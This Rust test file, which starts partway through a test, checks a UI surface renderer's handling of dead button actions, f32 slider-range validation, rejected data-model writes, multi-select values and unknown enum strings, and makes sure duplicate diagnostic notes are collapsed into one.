        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"Button","child":"lbl",
             "action":{"functionCall":{"call":"openUrl","args":{"url":{"path":"/link"}}}}},
            {"id":"lbl","component":"Text","text":"Visit"}
        ]}}
    ]"#;
    let rendered = apply(stream)
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    // An action that resolves to nothing leaves the button as dead as no
    // action at all, so it renders disabled and carries no handler —
    // nothing to click is a stronger guarantee than a click that is
    // dropped later.
    assert!(
        find_click(&rendered.element).is_none(),
        "a button that cannot carry out its action must not look live"
    );
    assert!(
        rendered.notes.iter().any(|n| n.detail.contains("openUrl")),
        "and it must say why, got: {:?}",
        rendered.notes
    );
    assert!(
        rendered
            .notes
            .iter()
            .any(|n| n.kind == NoteKind::Unreachable),
        "the dead control is reported as unreachable, got: {:?}",
        rendered.notes
    );
}

/// The repaired slider range has to survive the same test that rejected the
/// original: at the top of the f64 range `min + 1.0` rounds straight back
/// to `min`, and the note would then describe a range the widget does not
/// have.
#[test]
fn an_unrepairable_slider_range_falls_back_honestly() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"Slider","min":1e308,"max":1e308,"value":1e308}
        ]}}
    ]"#;
    let rendered = apply(stream)
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    let note = rendered
        .notes
        .iter()
        .find(|n| n.kind == NoteKind::InvalidValue && n.detail.contains("slider range"))
        .unwrap_or_else(|| panic!("expected a range note, got: {:?}", rendered.notes));
    assert!(
        note.detail.contains("using 0..=1"),
        "the note must describe the range the widget actually got, got: {}",
        note.detail
    );
}

/// The write path is driven by the user, so a control bound to an
/// unwritable pointer produced one note per keystroke and grew without
/// bound — every `render_a2ui` response carrying thousands of copies of
/// one problem.
#[test]
fn repeated_rejected_writes_record_one_note() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateDataModel":{"surfaceId":"s","value":{"items":[1]}}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"Text","text":"x"}
        ]}}
    ]"#;
    let mut client = apply(stream);
    let surface = client.surface_mut("s").expect("surface");
    for _ in 0..500 {
        assert!(
            surface
                .handle(A2uiMsg::SetString {
                    path: "/items/9".into(),
                    value: "nope".into(),
                })
                .is_empty(),
            "a data-model write is not a host-bound signal"
        );
    }
    assert_eq!(
        surface.notes().len(),
        1,
        "the same rejected write said 500 times is one problem, got: {:?}",
        surface.notes()
    );
}

// ── From the second 2026-08-05 review of PR #19 ───────────────────────────

/// The widget decides its range in f32, so validating in f64 proved
/// nothing: 1e39 narrows to infinity and the kit silently keeps its default
/// domain, while the note claimed otherwise. An accepted infinite bound was
/// worse — the widget's normalization divides by it and feeds NaN into
/// layout.
#[test]
fn slider_ranges_are_validated_in_the_widgets_own_precision() {
    // 1e39 overflows f32 to infinity; the second pair differs by less
    // than f32's step near 1.0 (~1.2e-7), so both bounds land on 1.0f32.
    for (min, max) in [(1e39_f64, 2e39_f64), (1.0, 1.000_000_01)] {
        let stream = format!(
            r#"[
            {{"version":"v0.9","createSurface":{{"surfaceId":"s","catalogId":"basic"}}}},
            {{"version":"v0.9","updateComponents":{{"surfaceId":"s","components":[
                {{"id":"root","component":"Slider","min":{min},"max":{max},"value":{min}}}
            ]}}}}
        ]"#
        );
        let rendered = apply(&stream)
            .surface("s")
            .expect("surface")
            .render(&Theme::light());
        assert!(
            rendered
                .notes
                .iter()
                .any(|n| n.kind == NoteKind::InvalidValue && n.detail.contains("slider range")),
            "{min}..={max} collapses in f32 and must be reported, got: {:?}",
            rendered.notes
        );
    }
}

/// A value JSON cannot carry is not a request to delete the binding.
/// `Surface::write(path, None)` *removes* the key, so mapping a
/// non-representable f64 to `None` silently erased the data the control was
/// bound to — and reported nothing, because the removal itself succeeded.
#[test]
fn an_unrepresentable_number_does_not_delete_the_binding() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateDataModel":{"surfaceId":"s","value":{"volume":0.5}}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"Text","text":"x"}
        ]}}
    ]"#;
    let mut client = apply(stream);
    let surface = client.surface_mut("s").expect("surface");
    assert!(
        surface
            .handle(A2uiMsg::SetNumber {
                path: "/volume".into(),
                value: f64::INFINITY,
            })
            .is_empty(),
        "a rejected write is not a host-bound signal"
    );
    assert_eq!(
        surface.data().pointer("/volume"),
        Some(&serde_json::json!(0.5)),
        "the model keeps its previous value rather than losing the key"
    );
    assert!(
        surface
            .notes()
            .iter()
            .any(|n| n.kind == NoteKind::RejectedWrite),
        "and the rejected write is reported, got: {:?}",
        surface.notes()
    );
}

/// A partial match is the damaging case: the picker renders as though the
/// values it cannot show were not there, and the next toggle writes the
/// visible selection back over them.
#[test]
fn a_multi_select_cannot_delete_values_it_cannot_show() {
    let stream = r#"[
        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
        {"version":"v0.9","updateDataModel":{"surfaceId":"s","value":{"tags":["a","legacy"]}}},
        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
            {"id":"root","component":"ChoicePicker","variant":"multipleSelection",
             "value":{"path":"/tags"},"options":[
                {"label":"A","value":"a"},{"label":"B","value":"b"}
             ]}
        ]}}
    ]"#;
    let rendered = apply(stream)
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    assert!(
        rendered
            .notes
            .iter()
            .any(|n| { n.kind == NoteKind::InvalidValue && n.detail.contains("legacy") }),
        "the value the picker cannot show must be reported, got: {:?}",
        rendered.notes
    );
}

/// Unrecognized enum strings each fall back to something plausible, which
/// is exactly why they need reporting: a typo renders as a perfectly
/// normal control and the stream is told it got what it asked for. The
/// `justify`/`align` path already reported these; the rest did not.
#[test]
fn unknown_enum_strings_are_reported() {
    let cases: [(&str, &str); 5] = [
        (
            r#"{"id":"root","component":"Text","text":"x","variant":"h9"}"#,
            "h9",
        ),
        (
            r#"{"id":"root","component":"Button","child":"c","variant":"ghosty"}"#,
            "ghosty",
        ),
        (
            r#"{"id":"root","component":"Divider","axis":"diagonal"}"#,
            "diagonal",
        ),
        (
            r#"{"id":"root","component":"List","direction":"sideways"}"#,
            "sideways",
        ),
        (
            r#"{"id":"root","component":"TextField","label":"l","variant":"sercet"}"#,
            "sercet",
        ),
    ];
    for (component, bad) in cases {
        let stream = format!(
            r#"[
            {{"version":"v0.9","createSurface":{{"surfaceId":"s","catalogId":"basic"}}}},
            {{"version":"v0.9","updateComponents":{{"surfaceId":"s","components":[
                {component},{{"id":"c","component":"Text","text":"y"}}
            ]}}}}
        ]"#
        );
        let rendered = apply(&stream)
            .surface("s")
            .expect("surface")
            .render(&Theme::light());
        assert!(
            rendered
                .notes
                .iter()
                .any(|n| n.kind == NoteKind::InvalidValue && n.detail.contains(bad)),
            "{bad} must be reported, got: {:?}",
            rendered.notes
        );
    }
}

/// `checks` was once modeled only on Button, TextField and CheckBox, so on
/// any other input serde's unknown-field tolerance swallowed it whole — a
/// stream that asked for a required selection was told its surface mapped
/// with full fidelity. The field exists on all six now and is enforced, so
/// what this pins is that every one of them still *sees* it: a rule these
/// components carry must either gate or say why it cannot, never vanish.
#[test]
fn every_input_sees_its_checks() {
    let cases = [
        r#"{"id":"root","component":"ChoicePicker","variant":"mutuallyExclusive","value":[],
            "options":[],"checks":[CHECK]}"#,
        r#"{"id":"root","component":"Slider","max":1.0,"value":0.0,"checks":[CHECK]}"#,
        r#"{"id":"root","component":"DateTimeInput","value":"2026-01-01","checks":[CHECK]}"#,
        r#"{"id":"root","component":"TextField","label":"L","value":"","checks":[CHECK]}"#,
        r#"{"id":"root","component":"CheckBox","label":"L","value":false,"checks":[CHECK]}"#,
    ];
    for template in cases {
        // A rule naming a function no build implements: the one condition
        // guaranteed to produce a note on every component that reads it.
        let component = template.replace(
            "CHECK",
            r#"{"condition":{"call":"noSuchPredicate","args":{}},"message":"m"}"#,
        );
        let stream = format!(
            r#"[
            {{"version":"v0.9","createSurface":{{"surfaceId":"s","catalogId":"basic"}}}},
            {{"version":"v0.9","updateComponents":{{"surfaceId":"s","components":[{component}]}}}}
        ]"#
        );
        let rendered = apply(&stream)
            .surface("s")
            .expect("surface")
            .render(&Theme::light());
        assert!(
            rendered
                .notes
                .iter()
                .any(|n| n.kind == NoteKind::UnimplementedFunction),
            "this component never evaluated its checks: {component}\ngot: {:?}",
            rendered.notes
        );
    }
}

/// Render notes are rebuilt every frame and a template multiplies them, so
/// the same bound the surface's notes gained has to apply here too — and
/// hitting it must say so rather than going quiet.
#[test]
fn render_notes_deduplicate_across_template_rows() {
    let rows: Vec<serde_json::Value> = (0..500).map(|i| serde_json::json!({"n": i})).collect();
    let stream = format!(
        r#"[
        {{"version":"v0.9","createSurface":{{"surfaceId":"s","catalogId":"basic"}}}},
        {{"version":"v0.9","updateDataModel":{{"surfaceId":"s","value":{{"rows":{}}}}}}},
        {{"version":"v0.9","updateComponents":{{"surfaceId":"s","components":[
            {{"id":"root","component":"Column",
             "children":{{"componentId":"row","path":"/rows"}}}},
            {{"id":"row","component":"Image","url":"https://example.com/a.png"}}
        ]}}}}
    ]"#,
        serde_json::to_string(&rows).expect("rows serialize")
    );
    let rendered = apply(&stream)
        .surface("s")
        .expect("surface")
        .render(&Theme::light());
    assert_eq!(
        rendered.notes.len(),
        1,
        "500 rows of one placeholder is one problem, got {} notes",
        rendered.notes.len()
    );
}
